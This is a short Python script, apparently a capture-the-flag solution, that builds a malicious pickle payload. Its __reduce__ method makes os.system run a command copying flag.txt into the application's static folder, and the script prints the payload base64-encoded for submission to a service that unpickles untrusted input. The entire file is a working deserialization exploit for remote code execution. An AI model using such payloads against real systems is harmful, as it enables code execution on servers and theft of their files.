import pickle
import base64
import os

payload = 'cp flag.txt application/static/.'

class RCE:
    def __reduce__(self):
        return os.system, (payload,)

if __name__ == '__main__':
    print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode('ascii'))

